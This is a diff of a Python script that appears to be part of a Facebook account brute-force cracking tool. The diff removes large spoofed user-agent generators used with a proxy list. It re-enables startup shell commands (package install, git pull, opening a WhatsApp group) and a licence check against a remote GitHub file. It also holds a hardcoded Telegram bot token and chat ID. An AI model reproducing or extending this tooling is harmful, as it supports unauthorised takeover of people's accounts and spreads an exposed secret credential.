@@ -67,192 +67,6 @@ try:
 except Exception as e:
   print(' server error')
 proxsi=open('socksku.txt','r').read().splitlines()
-
-###----------[ USER AGENT ]----------###
-for xd in range(10000):
-    a='Mozilla/5.0 (Symbian/3; Series60/5.2'
-    b=random.randrange(1, 9)
-    c=random.randrange(1, 9)
-    d='NokiaN8-00/012.002;'
-    e=random.randrange(100, 9999)
-    f='Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/'
-    g=random.randrange(1, 9)
-    h=random.randrange(1, 4)
-    i=random.randrange(1, 4)
-    j=random.randrange(1, 4)
-    k='7.3.0 Mobile Safari/533.4 3gpp-gba'
-    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
-    ugen.append(uaku) 
- ###----------[ User Agent Linux ]---------- ###
-for i in range(10000):
-    aa='Mozilla/5.0 (Linux; Android'
-    b=random.choice(['6','7','8','9','10','11','12'])
-    c='Redmi 6A Build/N2G47H)'
-    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    e=random.randrange(1, 999)
-    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
-    h=random.randrange(73,100)
-    i='0'
-    j=random.randrange(4200,4900)
-    k=random.randrange(40,150)
-    l='Mobile Safari/537.36'
-    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
-    ugen.append(uaku2)
-#User Agnes buatan Asep Yusup 
-    rr = random.randint
-    rc = random.choice
-    satu = f"Mozilla/5.0 (Linux; Android {str(rr(211111,299999))}; CPH2457) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ {str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} Mobile Safari/537.36"
-    dua  = f"Mozilla/5.0 (Linux; Android {str(rr(7,12))}; Infinix X671) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ {str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36"
-    tiga  = f"Mozilla/5.0 (Linux; Android {str(rr(111111,199999))}; 4188S Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) {str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} Version/4.0 Chrome/ {str(rr(2111111,2999999))} Mobile Safari/537.36"
-    empat  = f"Mozilla/5.0 (Linux; Android {str(rr(7,12))}; Moto X40 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/ {str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36"
-    uaku2 = str(rc([satu,dua,tiga,empat]))
-    ugen.append(uaku2)
-
-for agenku in range(10000):
-  a='Mozilla/5.0 (Linux; Android'
-  b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
-  c=random.choice(['M2006C3MII'])
-  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-  e=random.randrange(1, 999)
-  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-  g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
-  h=random.randrange(80,103)
-  i='0'
-  j=random.randrange(4200,4900)
-  k=random.randrange(40,150)
-  l='Mobile Safari/537.36'
-  uakuh=f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
-  usragent.append(uakuh)
-  
-  a='Mozilla/5.0 (Linux; Android'
-  b=random.choice(['8.1.0','9','10','11','12','13'])
-  c='Redmi Note 9 Pro Build/QKQ1.191215.002; wv)'
-  d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
-  e=random.randrange(73,100)
-  f='0'
-  g=random.randrange(4200,4900)
-  h=random.randrange(40,150)
-  i='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/399.0.0.24.93;]'
-  uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
-  usragent.append(uakuh)
-
-  aa='Mozilla/5.0 (Linux; U; Android'
-  b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
-  c=random.choice(['801SO'])
-  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-  e=random.randrange(1, 999)
-  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-  g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
-  h=random.randrange(80,103)
-  i='0'
-  j=random.randrange(4200,4900)
-  k=random.randrange(40,150)
-  l='Mobile Safari/537.36 OPR/63.0.2254.62069'
-  uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
-  usragent.append(uakuh)
-  
-  a='Mozilla/5.0 (Linux; Android'
-  b=random.choice(['8.1.0','9','10','11','12','13'])
-  c='SM-G960N Build/QP1A.190711.020; wv)'
-  d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
-  e=random.randrange(73,100)
-  f='0'
-  g=random.randrange(4200,4900)
-  h=random.randrange(40,150)
-  i='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/399.0.0.24.93;]'
-  uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
-  usragent.append(uakuh)
-
-  aa='Mozilla/5.0 (Linux; Android'
-  b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
-  c=random.choice(['SM-J610F'])
-  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-  e=random.randrange(80,106)
-  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-  g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
-  h=random.randrange(80,103)
-  i='0'
-  j=random.randrange(4200,4900)
-  k=random.randrange(40,150)
-  l='Mobile Safari/537.36'
-  uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
-  usragent.append(uakuh)
-  
-  aa='Mozilla/5.0 (Linux; U; Android'
-  b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
-  c=random.choice(['LE2113'])
-  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-  e=random.randrange(1, 999)
-  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-  g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
-  h=random.randrange(80,103)
-  i='0'
-  j=random.randrange(4200,4900)
-  k=random.randrange(40,150)
-  l='Mobile Safari/537.36'
-  uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
-  usragent.append(uakuh)
-
-  aa='Mozilla/5.0 (Linux; U; Android'
-  b=random.choice(['6','7','8','9','10','11','12'])
-  c=(['en-us; RMX1925 Build/QKQ1.200209.002)'])
-  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-  e=random.randrange(1, 999)
-  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-  g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
-  h=random.randrange(73,100)
-  i='0'
-  j=random.randrange(4200,4900)
-  k=random.randrange(40,150)
-  l='Mobile Safari/537.36 HeyTapBrowser/45.7.0.0'
-  uakuh=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
-  usragent.append(uakuh)
-  
-  aa='Mozilla/5.0 (Linux; U; Android'
-  b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
-  c=random.choice(['M2012K11C'])
-  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-  e=random.randrange(1, 999)
-  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-  g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
-  h=random.randrange(80,103)
-  i='0'
-  j=random.randrange(4200,4900)
-  k=random.randrange(40,150)
-  l='Mobile Safari/537.36 OPR/51.4.5237.26623'
-  uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
-  usragent.append(uakuh)
-  
-  aa='Mozilla/5.0 (Linux; U; Android'
-  b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
-  c=random.choice(['vivo 1002T'])
-  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-  e=random.randrange(1, 999)
-  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-  g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
-  h=random.randrange(80,103)
-  i='0'
-  j=random.randrange(4200,4900)
-  k=random.randrange(40,150)
-  l='Mobile Safari/537.36'
-  uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
-  usragent.append(uakuh)
-  
-  aa='Mozilla/5.0 (Linux; U; Android'
-  b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
-  c=random.choice(['CPH2083'])
-  d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-  e=random.randrange(1, 999)
-  f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-  g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
-  h=random.randrange(80,103)
-  i='0'
-  j=random.randrange(4200,4900)
-  k=random.randrange(40,150)
-  l='Mobile Safari/537.36 GoogleApp/13.44.10.26.arm64'
-  uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
-  usragent.append(uakuh)
 id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
 cokbrut=[]
 pwpluss,pwnya=[],[]
@@ -330,14 +144,14 @@ token = ('6628496363:AAFRd1HpukVfL1uuaXfUPABhyaAfLYkzRTU')
 ID = ('1778046662')
 def clear():
   os.system('clear')
-#os.system("pkg install espeak")
-#os.system("git pull")
+os.system("pkg install espeak")
+os.system("git pull")
 os.system("clear")
-#jalan('\033[38;5;196m                 INSTALLING TOOLS           ')
-#jalan('\033[38;5;34m                       WAIT               ')
-#os.system('espeak -b 30 "WAIT"')
-#time.sleep(0.03)
-#os.system("xdg-open https://chat.whatsapp.com/ImgbbAV3zyu5LK4aIX4EnO");
+jalan('\033[38;5;196m                 INSTALLING TOOLS           ')
+jalan('\033[38;5;34m                       WAIT               ')
+os.system('espeak -b 30 "WAIT"')
+time.sleep(0.03)
+os.system("xdg-open https://chat.whatsapp.com/ImgbbAV3zyu5LK4aIX4EnO");
 os.system('clear')
 def banner():
     print("""\033[38;5;33m
@@ -360,8 +174,8 @@ kffff=('KING')
 class Process:
     def __init__(self):
         self.cc=[]
-        #self.key="ATOM="+base64.b16encode(str(os.getuid()).encode()).decode()+"=XD"
-        self.key=""
+        self.key="ATOM="+base64.b16encode(str(os.getuid()).encode()).decode()+"=XD"
+        #self.key=""
         self.clear()
         r = self.Gex('https://github.com/ATONxSMILE404/APPRO/raw/main/Approve.txt')
         if self.key in r:
